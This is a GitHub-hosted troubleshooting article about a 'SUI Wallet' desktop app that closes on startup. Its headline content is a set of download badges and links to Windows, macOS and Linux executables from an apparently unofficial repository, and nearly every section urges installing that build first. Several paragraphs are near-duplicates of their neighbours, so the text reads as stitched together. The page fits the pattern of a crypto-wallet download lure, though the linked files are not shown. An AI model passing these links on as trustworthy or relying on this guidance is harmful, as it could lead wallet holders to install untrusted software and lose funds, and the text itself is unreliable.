![SUI Wallet](assets/banner-article.png)

# Why SUI Wallet closes on startup

A window that appears and vanishes is usually a local state problem, not a lost account.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A window that appears and disappears is almost always an older build failing on start-up rather than a
damaged account. Install the current release first: the reported problems are fixed there, and this is the
behaviour an older build produces. If it still closes on the current release, the next suspects are a second
copy already running and a machine below the requirement.

## What closing actually tells you

The application started, drew a window, and stopped. That sequence rules out the block screens, which prevent a launch rather than interrupt one, and it rules out a missing download, which never opens a window at all. What is left is a start-up fault.

What is left is a start-up failure inside the application. Older builds fail there more often than current
ones, which is why the first move is an update rather than a repair.

It also rules out the account: an application that cannot keep a window open has not read a phrase, signed anything or moved a balance, and those are the only ways a start-up fault could touch funds. What fails here is the program, not the thing it was going to show.

## Install the current release first

This is the fix for most reports and it costs one download. Take the file for your platform from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), run it over the existing installation on that machine, and open the app again. The account is not touched by the installer at all.

Windows users take the installer, macOS users the disk image, Linux users the archive. The account is not
touched by any of them, because the account is the 24 words rather than the installation.

## A second copy already running

Two copies competing for the same profile is a start-up failure that looks like a crash. One locks what the other needs, and the second exits rather than waiting for it. Close every window, check the process list, then open one copy.

Close every window, check the system's own process list for a copy that is still running, and open one. If
the app then stays open, the profile was contested rather than damaged.

## The machine below the requirement

A machine under the published requirement can start the application and fail to keep it running. That is the build asking for something the machine does not have, rather than a fault in the build, and no setting changes the answer for it.

The requirement strings are Windows 10 (1909) or later 64-bit, macOS 12 or later, and x64 Linux with Ubuntu
20.04 or later or equivalent. [SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) turns them into a supported and
unsupported table, which is faster than guessing from symptoms.

## What the diagnostics panel shows

When the app does open long enough to reach its menus, the diagnostics panel names the version, the network
and the digest of the last transaction handled. The version is the line worth reading first: a build older
than the current release is the explanation for everything above.

That panel is also what makes a report answerable. A screenshot of it carries the version, the network and
the state in one image, which is more than a description of a crash usually manages.

## When it is macOS or Windows blocking it

A window that closes immediately on macOS can be a quarantine issue rather than a crash, and on Windows it
can be a SmartScreen decision made for the process rather than the file. Both have their own article, and
both are recognisable by the panel that appears just before the window vanishes.

[SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) walks the three start-up causes in order, including the case
where no window appears at all. [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) covers the update
itself if the build on the machine is the older one.

## What never helps

Reinstalling an older build, deleting the profile folder, and running the app as an administrator are the
three moves that turn this into a longer afternoon. The first reintroduces the failure; the second risks the
account if the phrase is not written down; the third changes nothing about a start-up fault.

What does help is the version number. It converts "it crashes" into "this build fails here", and the answer
to that is a download.

There is a fourth move worth avoiding: running an unreleased build from a link in a message because it is said to fix the crash. That is how a support problem becomes a theft, and it is the one mistake in this article that cannot be undone by installing the release afterwards.

## FAQ

### Why does SUI Wallet quit as soon as it opens?

Usually because the build is older than the current release. Install the current release, then check for a
second copy already running before looking at anything else.

### Does this mean my funds are gone?

No. The account exists on the chain and is derived from the 24 words; an application that will not stay open
has no effect on either.

### Will reinstalling fix it?

Installing the current release usually does. Removing the application and starting again fixes nothing that
the update would not, and it discards the local profile.

### Why does it open on another machine?

Because the failure is local: a build, a profile lock or a machine below the requirement. The account is the
same on both machines, which is also why the second one works.

### What should I send if I report it?

The version from the diagnostics panel, the platform and its version, and what happens when you launch:
nothing, a panel, or a window that closes.

### Should I delete anything to fix this?

Not the profile, and not the phrase. Install the current release first; deleting things is the last step,
not the first.
